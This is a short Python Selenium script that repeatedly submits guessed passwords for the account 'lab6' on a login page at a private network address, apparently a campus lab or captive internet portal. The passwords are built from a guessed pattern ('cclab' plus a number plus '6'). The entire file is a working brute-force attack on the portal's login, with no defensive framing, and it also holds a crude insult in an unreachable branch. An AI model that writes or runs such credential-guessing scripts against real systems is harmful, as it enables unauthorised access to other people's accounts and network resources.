from selenium import webdriver
import time
driver = webdriver.Chrome('C:\web drivers\chromedriver')
options = webdriver.ChromeOptions()
options.add_argument('--ignore-certificate-errors-spki-list')
options.add_argument('--ignore-ssl-errors')
#driver = webdriver.chrome(chrome_options=options)
driver.get('http://172.172.172.100:8090/httpclient.html')
driver.find_element_by_name('username').send_keys('lab6')
for i in range(170,1000):
	if(i<10):
		driver.find_element_by_name('password').send_keys('cclab00'+str(i)+'6')
		print('cclab00'+str(i)+'6')
		driver.find_element_by_xpath('//*[@id="logincaption"]').click()
	elif(i>=10 and i<100):
		driver.find_element_by_name('password').send_keys('cclab0'+str(i)+'6')
		print('cclab0'+str(i)+'6')
		driver.find_element_by_xpath('//*[@id="logincaption"]').click()
	elif(i>=100 and i<1000):
		driver.find_element_by_name('password').send_keys('cclab'+str(i)+'6')
		print('cclab'+str(i)+'6')
		driver.find_element_by_xpath('//*[@id="logincaption"]').click()
	else:
		print("chutiya")
	time.sleep(0.8)
	
		
